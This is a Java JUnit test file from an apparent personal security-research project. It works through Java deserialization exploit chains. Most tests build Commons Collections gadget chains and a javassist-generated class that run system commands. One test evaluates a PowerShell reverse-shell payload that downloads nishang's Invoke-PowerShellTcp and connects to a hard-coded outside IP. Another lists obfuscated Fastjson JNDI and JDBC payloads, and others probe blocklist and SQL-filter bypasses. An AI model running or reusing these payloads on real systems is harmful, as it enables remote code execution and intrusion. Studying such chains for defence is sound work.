package com.pinger.javasec;

import cn.hutool.Hutool;
import cn.hutool.core.codec.Base64;
import cn.hutool.core.date.DateUtil;
import cn.hutool.core.io.FileUtil;
import cn.hutool.core.util.ReUtil;
import cn.hutool.crypto.digest.DigestUtil;
import cn.hutool.crypto.symmetric.AES;
import cn.hutool.crypto.symmetric.SymmetricAlgorithm;
import cn.hutool.crypto.symmetric.SymmetricCrypto;
import cn.hutool.json.JSONArray;
import cn.hutool.json.JSONObject;
import cn.hutool.json.JSONUtil;
import com.pinger.javasec.common.CC2;
import com.pinger.javasec.common.CC3;
import com.pinger.javasec.fastjson.User;
import com.pinger.javasec.util.SerialUtil;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import jdk.nashorn.api.scripting.NashornScriptEngine;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.regexp.RE;
import org.apache.regexp.RECompiler;
import org.apache.regexp.RESyntaxException;
import org.junit.jupiter.api.Test;
import sun.misc.Unsafe;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.json.JsonObject;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.Charset;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.security.Key;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static java.nio.charset.StandardCharsets.UTF_8;
import static java.util.stream.Collectors.collectingAndThen;
import static java.util.stream.Collectors.joining;
import static org.mozilla.classfile.DefiningClassLoader.getContextClassLoader;

/**
 * @author : p1n93r
 * @date : 2021/3/31 13:01
 */
public class BasicTest {


    @Test
    public void test1() throws Exception{
        String host="2usm73.dnslog.cn";
        InetAddress.getByName(host);
    }


    @Test
    public void test2() throws Exception{
        FileInputStream inputStream = new FileInputStream(new File("C:/payload1"));
        new ObjectInputStream(inputStream).readObject();
    }

    @Test
    public void test4() throws Exception{
        // 测试一下ChainedTransformer利用
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });
        HashMap<Object, Object> hashMap = new HashMap<>();
        Map evalMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        evalMap.put("test","test");
    }


    @Test
    public void test5(){
        // 测试一下ChainedTransformer利用
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        });
        HashMap<Object, Object> hashMap = new HashMap<>();

        // 测试一下lazyMap
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
        lazyMap.get("test");
    }

    @Test
    public void test6() throws Throwable {
        Transformer[] trueTransformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
                new ConstantTransformer(1)
        };

        // 测试一下ChainedTransformer利用
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(1)
        });
        HashMap<Object, Object> hashMap = new HashMap<>();

        // 获取lazyMap
        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);

        // 将LazyMap封装在AnnotationInvocationHandler中，想办法触发AnnotationInvocationHandler#invoke方法，因为invoke方法内调用了lazyMap#get
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);

        // 如何调用AnnotationInvocationHandler#invoke方法呢？可以使用代理，将前面获取的AnnotationInvocationHandler对象作为代理的handler
        // 那么只要调用代理对象的任何方法，都将触发AnnotationInvocationHandler对象的invoke方法
        // 获取一个代理对象，将前面获取的AnnotationInvocationHandler实例作为代理对象的InvocationHandler
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        // 最后将proxyMap封装在AnnotationInvocationHandler对象中，作为反序列化入口
        InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap);

        // 最后再把真正的Transformer传入chainedTransformer
        Class<? extends ChainedTransformer> chainedTransformerClass = chainedTransformer.getClass();
        Field iTransformers = chainedTransformerClass.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer,trueTransformer);
        // 序列化和反序化测试
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(res);
        new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())).readObject();
    }


    @Test
    public void test7() throws Exception{
        // 用P神的链打一下
        Transformer[] trueTransformer = {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(trueTransformer);
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value","test");
        Map evalMap = TransformedMap.decorate(hashMap, null, chainedTransformer);
        Class<?> clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Retention.class, evalMap);
        // 序列化和反序列化测试
        SerialUtil.runPayload(handler);
    }



    @Test
    public void test8() throws Exception{
        Class<TrAXFilter> clazz = TrAXFilter.class;
        clazz.getConstructor(new Class[]{Templates.class});
    }


    @Test
    public void testFiled() throws Exception{
        HashMap<Object, Object> hashMap1 = new HashMap<>();
        HashMap<Object, Object> hashMap2 = new HashMap<>();
        hashMap1.put("p1n93r",1);
        hashMap2.put("p1n93s",6);
        int i = hashMap1.hashCode();
        int i1 = hashMap2.hashCode();
        System.out.println(i);
        System.out.println(i1);
    }


    @Test
    public void testDiff(){
        // 先查看最新版本的黑名单Class
        HashSet<String> blocklist1 = new HashSet<>();
        HashSet<String> blocklist2 = new HashSet<>();
        HashSet<String> blocklist3 = new HashSet<>();

        String tmp="java.lang.Class," +
                "java.lang.ClassLoader," +
                "java.lang.Compiler," +
                "java.lang.InheritableThreadLocal," +
                "java.lang.Package," +
                "java.lang.Process," +
                "java.lang.Runtime," +
                "java.lang.RuntimePermission," +
                "java.lang.SecurityManager," +
                "java.lang.System," +
                "java.lang.Thread," +
                "java.lang.ThreadGroup," +
                "java.lang.ThreadLocal," +
                "javax.script.ScriptEngineManager," +
                "javax.servlet.ServletContext," +
                "javax.persistence.EntityManager," +
                "org.apache.tomcat.InstanceManager," +
                "org.springframework.context.ApplicationContext," +
                "com.atlassian.applinks.api.ApplicationLinkRequestFactory," +
                "com.atlassian.core.util.ClassLoaderUtils," +
                "com.atlassian.core.util.ClassHelper";
        System.out.println("==========最新版的黑名单信息：=========");
        String[] split = tmp.split(",");
        System.out.println(split.length);
        System.out.println(Arrays.asList(split));
        blocklist1.addAll(Arrays.asList(split));

        System.out.println("==========7.5.1版的黑名单信息：=========");
        // 7.5.1版本的黑名单
        String tmp1="java.lang.Class," +
                "java.lang.ClassLoader," +
                "java.lang.Compiler," +
                "java.lang.InheritableThreadLocal," +
                "java.lang.Package," +
                "java.lang.Process," +
                "java.lang.Runtime," +
                "java.lang.RuntimePermission," +
                "java.lang.SecurityManager," +
                "java.lang.System," +
                "java.lang.Thread," +
                "java.lang.ThreadGroup," +
                "java.lang.ThreadLocal," +
                "javax.script.ScriptEngineManager," +
                "javax.servlet.ServletContext," +
                "javax.persistence.EntityManager," +
                "org.apache.tomcat.InstanceManager," +
                "org.springframework.context.ApplicationContext," +
                "com.atlassian.applinks.api.ApplicationLinkRequestFactory," +
                "com.atlassian.core.util.ClassLoaderUtils," +
                "com.atlassian.core.util.ClassHelper";

        String[] split1 = tmp1.split(",");
        System.out.println(split1.length);
        System.out.println(Arrays.asList(split1));
        blocklist2.addAll(Arrays.asList(split1));


        System.out.println("==========7.5.0版的黑名单信息：=========");
        String tmp2="java.lang.Class," +
                "java.lang.ClassLoader," +
                "java.lang.Compiler," +
                "java.lang.InheritableThreadLocal," +
                "java.lang.Package," +
                "java.lang.Process," +
                "java.lang.Runtime," +
                "java.lang.RuntimePermission," +
                "java.lang.SecurityManager," +
                "java.lang.System," +
                "java.lang.Thread," +
                "java.lang.ThreadGroup," +
                "java.lang.ThreadLocal," +
                "javax.script.ScriptEngineManager," +
                "javax.servlet.ServletContext," +
                "javax.persistence.EntityManager," +
                "org.apache.tomcat.InstanceManager," +
                "org.springframework.context.ApplicationContext," +
                "com.atlassian.applinks.api.ApplicationLinkRequestFactory," +
                "com.atlassian.core.util.ClassLoaderUtils," +
                "com.atlassian.core.util.ClassHelper";
        String[] split2 = tmp2.split(",");
        System.out.println(split2.length);
        System.out.println(Arrays.asList(split2));
        blocklist3.addAll(Arrays.asList(split2));

        System.out.println("==============对比一下三个版本黑名单=============");
        System.out.println(blocklist1);
        System.out.println(blocklist2);
        System.out.println(blocklist3);



    }


    @Test
    public void testJS() throws Exception{
        ScriptEngineManager scriptEngineManager = new ScriptEngineManager();
        ScriptEngine js = scriptEngineManager.getEngineByName("js");

        //java.lang.Runtime.getRuntime().exec(java.lang.Runtime.getRuntime().exec(\"powershell -nop -exec bypass -c \\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 7777\\"\"))
        String payload="powershell -nop -exec bypass -c \\\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 7777\\\"";
        String poc="java.lang.Runtime.getRuntime().exec(\""+payload+"\")";
        js.eval(poc);
    }


    /**
     * Weblogic在野T3最新0day分析
     * 时间：2021-04-21
     */
    @Test
    public void testT3(){
        LinkedHashMap<Object, Object> obj = new LinkedHashMap<>();
        System.out.println(obj);


    }



    @Test
    public void testT4() throws Exception{
        LinkedHashMap<String, Object> hashMap = new LinkedHashMap<>();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        SafeObjectInputStream safeObjectInputStream = new SafeObjectInputStream(byteArrayInputStream);
        Object object = safeObjectInputStream.readObject();
        System.out.println(object.getClass());
        System.out.println(object);

        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));
        Object unsafeObject = objectInputStream.readObject();
        System.out.println(unsafeObject.getClass());
        System.out.println(unsafeObject);
    }


    @Test
    public void testBypass() throws Exception{
        String[] whitelist = {
                "byte\\[\\]", "foo", "SerializationInjector",
                "\\[Z", "\\[B", "\\[S", "\\[I", "\\[J", "\\[F", "\\[D", "\\[C",
                "java..*", "sun.util.calendar..*", "org.apache.ofbiz..*",
                "org.codehaus.groovy.runtime.GStringImpl", "groovy.lang.GString"};
        Pattern pattern = Arrays.stream(whitelist)
                .map(String::trim)
                .filter(str -> !str.isEmpty())
                .collect(collectingAndThen(joining("|", "(", ")"), Pattern::compile));
        String className = "asdasdasdsadorg.apache.commons.beanutils.BeanComparator<javaasdasdasd.BeanComparatorasdasdasdasdasd";
        System.out.println("是否匹配：" + pattern.matcher(className).find());
    }


    @Test
    public void testLen(){
        System.out.println("org.apache.commons.beanutils.BeanComparator".length());
    }



    static protected URL[] getUrlArray(String codebase)
            throws MalformedURLException {
        // Parse codebase into separate URLs
        StringTokenizer parser = new StringTokenizer(codebase);
        Vector<String> vec = new Vector<>(10);
        while (parser.hasMoreTokens()) {
            vec.addElement(parser.nextToken());
        }
        String[] url = new String[vec.size()];
        for (int i = 0; i < url.length; i++) {
            url[i] = vec.elementAt(i);
        }

        URL[] urlArray = new URL[url.length];
        for (int i = 0; i < urlArray.length; i++) {
            urlArray[i] = new URL(url[i]);
        }
        return urlArray;
    }


    @Test
    public void testSome()throws Exception{
        String abstractTransletClassPath = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";

        // 使用javassist生成一个恶意的类
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(CC2.Placeholder.class));
        classPool.insertClassPath(new ClassClassPath(Class.forName(abstractTransletClassPath)));

        CtClass placeholder = classPool.get(CC2.Placeholder.class.getName());
        placeholder.setSuperclass(classPool.get(Class.forName(abstractTransletClassPath).getName()));
        // 这里insertBefore还是After都一样，反正都是在静态初始化块里写代码
        placeholder.makeClassInitializer().insertBefore("java.lang.Runtime.getRuntime().exec(\"calc\");");
        placeholder.setName("EvalClass");
        // 得到恶意类的字节码
        byte[] evalByte = placeholder.toBytecode();
        FileOutputStream out = new FileOutputStream(new File("C:/Exploit.class"));
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(out);
        objectOutputStream.writeObject(placeholder);

        ClassLoader parent = getContextClassLoader();
        ClassLoader cl = URLClassLoader.newInstance(getUrlArray("http://127.0.0.1/#Exploit"), parent);


    }



    @Test
    public void testEl(){
        String[] dnsLogPayloads = {
                "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://dnslog-url/miao1\",\"autoCommit\":true}}",
                "{\"name\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073\",\"\\u0076\\u0061\\u006c\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\"},\"x\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://dnslog-url/miao2\",\"autoCommit\":true}}",
                "{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"ldap://dnslog-url/miao3\",\"autoCommit\":true}}",
                "{\"b\":{\"\\u0040\\u0074\\u0079\\u0070\\u0065\":\"\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c\",\"\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065\":\"rmi://dnslog-url/miao4\",\"autoCommit\":true}}",
                "{\"x\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.jdbc.JDBC4Connection\",\"hostToConnectTo\":\"dnslog-url\",\"portToConnectTo\":80,\"info\":{\"user\":\"root\",\"password\":\"ubuntu\",\"useSSL\":\"false\",\"statementInterceptors\":\"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"},\"databaseToConnectTo\":\"mysql\",\"url\":\"\"}}",
                "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection\",\"proxy\":{\"connectionString\":{\"url\":\"jdbc:mysql://dnslog-url:80/foo?allowLoadLocalInfile=true\"}}}",
                "{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"com.mysql.cj.jdbc.ha.ReplicationMySQLConnection\",\"proxy\":{\"@type\":\"com.mysql.cj.jdbc.ha.LoadBalancedConnectionProxy\",\"connectionUrl\":{\n" +
                        "\"@type\":\"com.mysql.cj.conf.url.ReplicationConnectionUrl\", \"masters\":\n" +
                        "[{\"host\":\"dnslog-url\"}], \"slaves\":[],\n" +
                        "\"properties\":{\"host\":\"mysql.host\",\"user\":\"root\",\"dbname\":\"dbname\",\"password\":\"pass\",\"queryInterceptors\":\"com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor\",\"autoDeserialize\":\"true\"}}}}",
                "{\"a\":{\"@type\":\"com.alibaba.fastjson.JSONObject\",{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao5\"}}\"\"},\"b\":{{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao6\"}:\"x\"},\"c\":{{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao7\"}:0,\"d\":Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao8\"}],\"e\":Set[{\"@type\":\"java.net.URL\",\"val\":\"http://dnslog-url/miao9\"},}",
                "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog-url\"}}",
                "{\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog-url\"}",
                "{\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog-url\"}"
        };

        for (String dnsLogPayload : dnsLogPayloads) {
            System.out.println(dnsLogPayload);
            System.out.println();
        }



    }


    @Test
    public void testAscii(){
        String enc="108  101  109  111  110  64  108  111  99  97  108  104  111  115  116";
        String[] s = enc.split("  ");
        StringBuffer res=new StringBuffer();
        for (String exp : s) {
            int v = Integer.valueOf(exp);
            res.append((char)v);
        }
        System.out.println(res);
    }



    @Test
    public void testOgnlOnMybatis(){
        StringBuilder sql = new StringBuilder();
        sql.append("<bind name=\"exampleHasAtLeastOneCriteriaCheck\" value=\"@tk.mybatis.mapper.util.OGNL@exampleHasAtLeastOneCriteriaCheck(");
        sql.append("evalasdasd").append(")\"/>");
        System.out.println(sql.toString());
    }



    @Test
    public void testVulJson(){
        String jsonPath = "C:\\Users\\18148\\Desktop\\规则交付\\规则测试\\author\\极光&xray测试\\第五波测试\\ES专门测.json";
        JSONArray jsonArray = JSONUtil.readJSONArray(new File(jsonPath), UTF_8);
        for(int i =0; i< jsonArray.size();i++){
            JSONObject current = (JSONObject)jsonArray.get(i);
            current.set("id",4015+i);
            JSONArray tmp = new JSONArray();
            JSONObject net = new JSONObject();
            net.set("net","192.168.192.152");
            tmp.add(net);
            current.set("services",tmp);
//            current.set("author","gan.cao");
        }
        FileUtil.writeString(jsonArray.toString(),jsonPath+"-带author-带net.new",UTF_8);
    }

    @Test
    public void testCreateJson(){
        /**
         *
         * {
         * 	"patterns": [{
         * 		"pattern": "/tag_test_action\\.php",
         * 		"location": ["REQUEST_LINE_PARAMS"]
         *        }, {
         * 		"pattern": "partcode\\s*=\\s*{dede:field\\s+name\\s*=\\s*'source'\\s*runphp\\s*=\\s*'yes'\\s*}.*?{/dede:field}",
         * 		"location": ["REQUEST_BODY_FORM_PARAMS", "REQUEST_LINE_PARAMS"]
         *    }],
         * 	"services": [
         * 		[{
         * 			"net": ["192.168.192.162"]
         *        }]
         * 	],
         * 	"title": "DedeCms v5.7 后台任意代码执行",
         * 	"vid": "CVE-2018-7700",
         * 	"action": "reset_client",
         * 	"risk": "critical",
         * 	"id": 2076,
         * 	"credit": 1
         * }
         *
         *
         */

        String jsonPath = "C:\\Users\\18148\\Desktop\\规则交付\\规则测试\\author\\极光&xray测试\\第一波测试\\auto_created_rule.json";
        JSONArray array = JSONUtil.createArray();
        for(int i=0;i<300;i++){
            JSONObject item = JSONUtil.createObj();
            item.set("title","random-"+i);
            item.set("vid","CVE-"+i);
            item.set("action","reset_client");
            item.set("risk","critical");
            item.set("id",i+318);
            item.set("credit",1);
            JSONArray patterns = JSONUtil.createArray();
            JSONArray services = JSONUtil.createArray();
            JSONArray net = JSONUtil.createArray();
            JSONObject location = JSONUtil.createObj();
            JSONObject targetNet = JSONUtil.createObj();
            targetNet.set("net",new String[]{"192.168.192.162"});
            location.set("pattern","/tag_test_action/"+i);
            ArrayList<String> strings = new ArrayList<>();
            strings.add("REQUEST_BODY_FORM_PARAMS");
            strings.add("REQUEST_LINE_PARAMS");
            location.set("location",strings);
            patterns.add(location);
            net.add(targetNet);
            services.add(net);
            item.set("patterns",patterns);
            item.set("services",services);
            array.add(item);
        }

        String res = array.toString();
        System.out.println(res);

        FileUtil.writeString(array.toString(),jsonPath,UTF_8);


    }

    @Test
    public void testJsonVulId(){
        String jsonPath = "C:\\Users\\18148\\Desktop\\规则交付\\规则测试\\author\\极光&xray测试\\第五波测试\\all_json.json";
        String toPath = "C:\\Users\\18148\\Desktop\\规则交付\\规则测试\\author\\极光&xray测试\\第五波测试\\new_json.json";
        JSONArray jsonArray = JSONUtil.readJSONArray(new File(jsonPath), UTF_8);
        int count = 0;
        JSONArray newJsonArray = JSONUtil.createArray();
        ArrayList<HashMap> resLog = new ArrayList<>();
        String dateStr = "2016-01-01";
        int judge = 0;
        Date date = DateUtil.parse(dateStr);
        for(int i =0; i< jsonArray.size();i++){
            JSONObject current = (JSONObject)jsonArray.get(i);
            Object vid = current.get("vid");
            if("".equals(vid)){
                ++judge;
                if(judge >= 100){
                    judge = 1;
                    date = DateUtil.offsetDay(date, 1);
                }
                // 准备编号
                String vulId = "VUL-"+DateUtil.format(date, "yyyy-MMdd")+String.format("%02d",judge);
                current.set("vid",vulId);
                newJsonArray.add(current);
                HashMap<String, String> log = new HashMap<>();
                log.put("title",(String) current.get("title"));
                log.put("id",vulId);
                resLog.add(log);
                count++;
            }
        }
        resLog.forEach(v->{
            System.out.println(String.format("VUL_ID: %s, title: %s",v.get("id"),v.get("title")));
        });
        System.out.println("总共："+count+"个");
        FileUtil.writeString(newJsonArray.toString(),toPath,UTF_8);
    }

    @Test
    public void testTest(){
        String jsonPath = "C:\\Users\\18148\\Desktop\\规则交付\\规则测试\\author\\极光&xray测试\\第五波测试\\可验证漏洞.json";
        JSONArray jsonArray = JSONUtil.readJSONArray(new File(jsonPath), UTF_8);
        for(int i =0; i< jsonArray.size();i++){
            JSONObject current = (JSONObject)jsonArray.get(i);
            Object name = current.get("name");
            System.out.println(name);
        }

    }


    @Test
    public void testCreateAllRule(){
        String jsonPath = "C:\\Users\\18148\\Desktop\\规则交付\\所有的规则【部门】\\author\\author\\综合.json";
        String toPath = "C:\\Users\\18148\\Desktop\\规则交付\\所有的规则【部门】\\author\\author\\格式化后.json";
        JSONArray jsonArray = JSONUtil.readJSONArray(new File(jsonPath), UTF_8);

        JSONArray rules = JSONUtil.createArray();
        JSONObject res = JSONUtil.createObj();

        for(int i =0; i< jsonArray.size();i++){
            JSONObject current = (JSONObject)jsonArray.get(i);
            JSONObject newItem = JSONUtil.createObj();
            newItem.set("title",current.get("title"));
            newItem.set("action",((String)current.get("action")).split(","));
            newItem.set("patterns",current.get("patterns"));
            if(current.get("port")!=null&&!"".equals(current.get("port"))){
                newItem.set("port",current.get("port"));
            }else {
                newItem.set("port",0);
            }
            newItem.set("numbers",((String)current.get("vid")).split(","));
            String risk = (String) current.get("risk");
            String riskId = "";
            if ("critical".equals(risk)){
                riskId="4";
            }else if ("high".equals(risk)){
                riskId="3";
            }else if ("mid".equals(risk)){
                riskId="2";
            }else if ("low".equals(risk)){
                riskId="1";
            }
            newItem.set("severity",riskId);
            rules.add(newItem);
        }
        res.set("rules",rules);
        FileUtil.writeString(res.toString(),toPath,UTF_8);
    }


    @Test
    public void testAddFastjson(){
        String payloads = "D:\\tmp.txt";
        String toPath = "D:\\out.json";
        List<String> lines = FileUtil.readLines(payloads, UTF_8);
        JSONArray out = JSONUtil.createArray();
        for (String line : lines) {
            JSONObject item = JSONUtil.createObj();
            item.set("_location","request.body");
            item.set("_text_type","str");
            item.set("__hs_text",line);
            out.add(item);
        }
        FileUtil.writeString(out.toString(),toPath,UTF_8);
    }


    @Test
    public void testIf(){
        String valueAttr="111";
        String name="222";
        if (valueAttr != null) {
            System.out.println("111");
        } else if (name != null) {
            System.out.println("222");
        }
    }

    @Test
    public void testScanTag(){
        List<String> lines = FileUtil.readLines("C:\\Users\\18148\\Desktop\\all-tag.txt", UTF_8);
        Set<String> set = new HashSet<>();
        for (String line : lines) {
            List<String> resultFindAll = ReUtil.findAll("(#\\S+?\\()", line, 0, new ArrayList<>());
            if(resultFindAll.size()!=0){
                String tmp = resultFindAll.get(0);
                tmp = tmp.substring(0,tmp.length()-1);
                set.add(tmp);
            }
        }
        // 所有的tag
        System.out.println("[+] 所有的tag如下: ");
        for (String tag : set) {
            System.out.println(tag);
        }
    }

    @Test
    public void testSql(){
        String encodesqls = "select B.personuuid from ro_org A,ro_orgperson B where A.orguuid=B.orguuid and A.orglevelcode like '10030002%';";
        String sqls="";
        sqls=new String(com.icss.j2ee.util.Base64.decode("c2VsZWN0IEIucGVyc29udXVpZCBmcm9tIHJvX29yZyBBLHJvX29yZ3BlcnNvbiBCIHdoZXJlIEEub3JndXVpZD1CLm9yZ3V1aWQgYW5kIEEub3JnbGV2ZWxjb2RlIGxpa2UgJzEwMDMwMDAyJSc7".getBytes()));
        System.out.println(sqls);
        System.out.println(new String(com.icss.j2ee.util.Base64.encode(encodesqls.getBytes())));
        StringTokenizer st = new StringTokenizer(sqls,";");
        List sqlList = new LinkedList();
        while(st.hasMoreElements()) {
            sqlList.add(st.nextElement());
        }
        System.out.println(sqlList);

    }



    @Test
    public void testAddLoginName(){
        String payloads = "D:\\tmp\\login.txt";
        JSONArray jsonArray = JSONUtil.readJSONArray(new File(payloads), UTF_8);
        for(int i =0; i< jsonArray.size();i++){
            JSONObject current = (JSONObject)jsonArray.get(i);
            Object name = current.get("loginName");
            System.out.println(name);
        }
    }


    @Test
    public void testReg() throws RESyntaxException {
        RECompiler compiler = new RECompiler();
        if ((new RE(compiler.compile("json$"), 1)).match("/test;json")) {
            System.out.println("==============done============");
        }
    }

    @Test
    public void testReg2() throws Exception{
        String queryStr = "exeC";
        String regExp = "\\s(or|and|exec|insert|select|delete|drop|update|count|\\*|\\%|chr|mid|master|truncate|char|declare)\\s";
        Pattern pattern = Pattern.compile(regExp, 2);
        Matcher matcher = pattern.matcher(queryStr);
        if(!matcher.find()){
            System.out.println("=========绕过===========");
        }
    }


    @Test
    public void testReplace()throws Exception{
        String test = "{}{}";
        System.out.println(test.replace("{",""));
    }


